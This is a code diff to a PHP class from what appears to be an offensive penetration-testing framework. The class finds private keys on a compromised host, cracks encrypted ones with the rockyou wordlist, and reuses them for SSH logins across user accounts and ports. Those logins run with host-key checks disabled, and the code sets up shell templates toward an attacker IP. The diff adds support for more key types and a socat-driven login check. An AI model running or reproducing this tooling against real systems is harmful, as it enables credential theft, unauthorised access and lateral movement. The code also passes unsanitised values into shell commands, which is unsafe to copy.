@@ -16,29 +16,22 @@ class check4linux8key extends check4linux8enum{
     }
     
     
-    
-    public function keypriv2pem($private_key_file,$private_key_passwd){
-        $query = "file $private_key_file";
-        $check_pem = $this->req_ret_str($query);
-        if (strstr($check_pem, "PEM RSA private key")){
-            $this->note("Convert PEM for libssh - PHP");
-            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
-        }
-        return $private_key_file;
-    }
+
     
     
-    public function key8priv4pass2nopass($stream,$privkey_str_pass,$privkey_passwd):string{
+    public function key8priv4pass2nopass($stream,$privkey_str_pass,$privkey_passwd,$type_crypt):string{
         $hash = sha1($privkey_str_pass);
         $privkey_str = "";
         if (!$this->file4exist8path($stream, "/tmp/$hash.priv.pass")){
             $this->str2file($stream, $privkey_str_pass,"/tmp/$hash.priv.pass");
         }
-        if (!empty($privkey_passwd)) $privkey_str = $this->req_str($stream,"openssl rsa -in /tmp/$hash.priv.pass -passin pass:$privkey_passwd ",$this->stream_timeout,"");
-        return $this->key2norme8str($privkey_str);       
+        if (!empty($privkey_passwd)) $privkey_str = $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv.pass -passin pass:$privkey_passwd ",$this->stream_timeout,"");
+        return $this->key2norme8str($privkey_str,$type_crypt);       
     }
     
-    public function key2gen4priv2pem8str($stream,$privkey_str):string{
+    public function key2gen4priv2pem8str($stream,$privkey_str,$type_crypt):string{
+        $type_crypt = trim($type_crypt);
+        
         if (empty($privkey_str)) return $this->log2error("Empty Private Key");
         
         $hash = sha1($privkey_str);
@@ -46,34 +39,36 @@ class check4linux8key extends check4linux8enum{
         if (!$this->file4exist8path($stream, "/tmp/$hash.priv")){
             $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");
         }
-        
-        $this->req_str($stream,"openssl rsa -in /tmp/$hash.priv -outform pem -text -out /tmp/$hash.pem",$this->stream_timeout,"");
+
+        $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv -outform pem -text -out /tmp/$hash.pem",$this->stream_timeout,"");
         
         $this->req_str($stream,"ls -al /tmp/$hash.pem",$this->stream_timeout,"");
         $this->req_str($stream,"file /tmp/$hash.pem",$this->stream_timeout,"");
         }
         $pem_str = $this->req_str($stream,"cat /tmp/$hash.pem",$this->stream_timeout,"");
-        return $this->key2norme8str($pem_str);
+        return $pem_str;
     }
     
     
-    public function key2gen4priv2str($stream):string{
+    public function key2gen4priv2str($stream,$type_crypt):string{
         $this->ssTitre ( "Gen Private key " );
         $privkey_str = "";
-        $privkey_str = $this->req_str($stream,"openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 ",$this->stream_timeout,"");
-       return $this->key2norme8str($privkey_str);
+        $type_crypt = trim($type_crypt);
+        $privkey_str = $this->req_str($stream,"openssl genpkey -algorithm $type_crypt -pkeyopt $type_crypt._keygen_bits:4096 ",$this->stream_timeout,"");
+        return $this->key2norme8str($privkey_str,$type_crypt);
     }
     
     
     
-    public function key2gen4public2str($stream,$privkey_str){
+    public function key2gen4public2str($stream,$privkey_str,$type_crypt){
         $this->ssTitre ( "Gen Public key" );
+        $type_crypt = trim($type_crypt);
         $hash = sha1($privkey_str);
         if (!$this->file4exist8path($stream, "/tmp/$hash.priv")){
         $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");
         }
         if (!$this->file4exist8path($stream, "/tmp/$hash.pub")){
-        $this->req_str($stream,"openssl rsa -in /tmp/$hash.priv -pubout -out /tmp/$hash.tmp",$this->stream_timeout ,"");
+        $this->req_str($stream,"openssl $type_crypt -in /tmp/$hash.priv -pubout -out /tmp/$hash.tmp",$this->stream_timeout ,"");
         $this->req_str($stream,"head -5 /tmp/$hash.tmp",$this->stream_timeout,"" );
         $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f /tmp/$hash.tmp > /tmp/$hash.pub ",$this->stream_timeout,"");
         $this->req_str($stream,"ssh-keygen -l -f /tmp/$hash.pub ",$this->stream_timeout,"");
@@ -306,26 +301,54 @@ class check4linux8key extends check4linux8enum{
     }
     
     
-    public function key2stream($stream,$host,$username,$privkey_str,$ssh_port){
+    public function key2check($stream,$host,$username,$ssh_port,$privkey_str):bool{
+        $this->titre(__FUNCTION__);
+        $uid_name = "";
+        $hash = sha1($privkey_str);
+        $type_crypt = $this->key2type4crypt8str($privkey_str);
+        
+        $this->key2gen4public2str($stream,$privkey_str,$type_crypt);
+
+        $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
+        
+        
+        $query = "(sleep 3;echo '\\n';sleep 3;echo '\\n';sleep 3;echo '\\n';)  | socat - EXEC:\"ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -C 'id' -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null\",pty,stderr,setsid,sigint,ctty,sane  ";
+        $rst_id = $this->req_str($stream, $query, $this->stream_timeout, "");
+        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE || strstr($rst_id, "Permission denied, please try again.")!==FALSE){
+            $chaine = "Asking Password";
+            $this->rouge($chaine);
+            $data = "";
+            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
+            
+        }
+        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id_tst) = $this->parse4id($rst_id);
+        if (!empty($uid_name)) {
+            $this->yesUSERS($this->port2id, $username, "SSH private Key", "/bin/bash:$privkey_str");
+            return TRUE ;
+        }
+        else return FALSE;
+    }
+    
+    public function key2stream($stream,$host,$username,$privkey_str,$ssh_port,$type_crypt){
         $this->titre(__FUNCTION__);
         if (empty($privkey_str)) return $this->log2error("Empty Private Key");
         
         $hash = sha1($privkey_str);
 
  
-        $this->key2gen4priv2pem8str($stream,$privkey_str);
-        $pubkey_str = $this->key2gen4public2str($stream,$privkey_str);
+        $this->key2gen4priv2pem8str($stream,$privkey_str,$type_crypt);
+        $pubkey_str = $this->key2gen4public2str($stream,$privkey_str,$type_crypt);
         
         $this->req_str($stream,"chmod 0600 /tmp/$hash.pem",$this->stream_timeout,"");
         $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
         
-        $query = "ssh -i /tmp/$hash.priv $username@$host -p $ssh_port ";
+        $query = "ssh -i /tmp/$hash.priv $username@$host -p $ssh_port -o PasswordAuthentication=no ";
         $this->cmd("localhost",$query);
-        $query = "ssh -i /tmp/$hash.pem $username@$host -p $ssh_port ";
+        $query = "ssh -i /tmp/$hash.pem $username@$host -p $ssh_port -o PasswordAuthentication=no ";
         $this->cmd("localhost",$query);
         
         
-        $con = @ssh2_connect( $host, $ssh_port,array('hostkey'=>'ssh-rsa') );
+        $con = @ssh2_connect( $host, $ssh_port,array('hostkey'=>"ssh-$type_crypt") );
         if($con===FALSE) {
             $chaine = "Failed Connection";
             $this->log2error($chaine);
@@ -349,7 +372,6 @@ class check4linux8key extends check4linux8enum{
         
         if (@ssh2_auth_pubkey_file($con,$username,"/tmp/$hash.pub","/tmp/$hash.pem","")!==FALSE) {            
             $this->log2succes("Succes Private Key Authentication");
-            $this->port2shell(base64_encode($infos));
             $this->yesUSERS($this->port2id, $username, "SSH private Key", "/bin/bash:$infos");
             
             return $con ;
@@ -363,15 +385,15 @@ class check4linux8key extends check4linux8enum{
     }
     
     
-    public function key2pentest8attacker($stream,$username,$privkey_str,$ssh_port){
+    public function key2pentest8attacker($stream,$username,$privkey_str,$ssh_port,$type_crypt){
         $this->titre(__FUNCTION__);
         $hash = sha1($privkey_str);
-        $stream = $this->key2stream($stream, $this->ip, $username, $privkey_str, $ssh_port);
+        $stream = $this->key2stream($stream, $this->ip, $username, $privkey_str, $ssh_port,$type_crypt);
         
         if(is_resource($stream)){
             $info = "SSH Private Key:$privkey_str";
             $this->log2succes($info);
-            $template_shell = "ssh -i /tmp/$hash.priv -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null $username@$this->ip -p $ssh_port -C \"%SHELL%\" ";
+            $template_shell = "ssh -i /tmp/$hash.priv -o PasswordAuthentication=no  -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null $username@$this->ip -p $ssh_port -C \"%SHELL%\" ";
             
             $templateB64_shell = base64_encode($template_shell);
             $attacker_ip = $this->ip4addr4target($this->ip);
@@ -386,6 +408,19 @@ class check4linux8key extends check4linux8enum{
         }
     }
     
+    public function key2type4crypt8str($privkey_str){
+        
+        $type_crypt = "";
+        $type_crypt = exec("echo '$privkey_str' | grep 'BEGIN ' | grep ' PRIVATE KEY' | awk '{printf $2}' ");    
+      $this->article("TYPE", $type_crypt);
+      return $type_crypt;
+    }
+    
+    
+    public function key2type4crypt8path($privkey_path){
+        return  exec("cat $privkey_path | grep 'BEGIN ' | grep ' PRIVATE KEY/' | awk '{printf $2}' ");
+    }
+    
     public function key2list4priv($stream,$path2search):array{
         $this->titre(__FUNCTION__);
         $tab_privkeys_path = array();
@@ -396,12 +431,15 @@ class check4linux8key extends check4linux8enum{
         $tab_privkeys_path = $this->req_tab($stream,$data,$this->stream_timeout*4,$filter);
         $this->article("All Priv Keys Location Path", $this->tab($tab_privkeys_path));
         foreach ($tab_privkeys_path as $privkey_path){
-            $privkey_str_tmp = $this->req_str($stream, "cat $privkey_path", $this->stream_timeout, " | awk '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/' ");
+            $type_crypt = $this->key2type4crypt8path($privkey_path);
+            $type_crypt_up = strtoupper($type_crypt);
+            
+            $privkey_str_tmp = $this->req_str($stream, "cat $privkey_path", $this->stream_timeout, " | awk '/BEGIN $type_crypt_up PRIVATE KEY/,/END $type_crypt_up PRIVATE KEY/' ");
            
-            if (!empty($privkey_str_tmp)) {
+            if (!empty($privkey_str_tmp) && !empty($type_crypt) ) {
                 if (stristr($privkey_str_tmp, "ENCRYPTED")!==FALSE){
                     $privkey_passwd = $this->key2crack($privkey_str_tmp, "$this->dico_password.rockyou");
-                    $privkey_str = $this->key8priv4pass2nopass("", $privkey_str_tmp, $privkey_passwd);
+                    $privkey_str = $this->key8priv4pass2nopass("", $privkey_str_tmp, $privkey_passwd,$type_crypt);
                     $tab_privkeys_str[] = $privkey_str;
                 }
                 else {
@@ -417,9 +455,10 @@ class check4linux8key extends check4linux8enum{
     
 
     
-    public function key2norme8str($privkey_str):string{   
+    public function key2norme8str($privkey_str,$type_crypt):string{   
         $result = "";
-        if (!empty($privkey_str)) $result = $this->req_ret_str("echo '$privkey_str'  | awk '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/' ");  
+        $type_crypt = strtoupper($type_crypt);
+        if (!empty($privkey_str)) $result = $this->req_ret_str("echo '$privkey_str'  | awk '/BEGIN $type_crypt PRIVATE KEY/,/END $type_crypt PRIVATE KEY/' ");  
         return $result;
     }
     
@@ -452,10 +491,11 @@ class check4linux8key extends check4linux8enum{
         if (!empty($tab_privkeys_str)){
             foreach ($tab_privkeys_str as $privkey_str){
                 $privkey_str = trim($privkey_str);
+                $type_crypt = $this->key2type4crypt8str($privkey_str);
                     foreach ($tab_users_shell as $username){
                         foreach ($ssh_ports as $ssh_port){
                             if ( !empty($username) && !empty($ssh_port) && !empty($privkey_str) ) {
-                                $this->key2pentest8attacker("",$username,$privkey_str,$ssh_port);
+                                $this->key2pentest8attacker("",$username,$privkey_str,$ssh_port,$type_crypt);
                                 $this->key2pentest8target($stream,$username,$privkey_str,$ssh_port);
                             }
                         }
@@ -478,7 +518,7 @@ class check4linux8key extends check4linux8enum{
             $this->str2file($stream,$privkey_str, "/tmp/$hash.priv");            
         }
         $this->req_str($stream, "chmod 0600 /tmp/$hash.priv", $this->stream_timeout, "");
-        $template_id_euid = "ssh -i /tmp/$hash.priv  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%ID%\" ";        
+        $template_id_euid = "ssh -i /tmp/$hash.priv  $username@127.0.0.1 -p $ssh_port -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%ID%\" ";        
         $this->pentest8id($stream,$template_id_euid);
         //===============================================================
     }
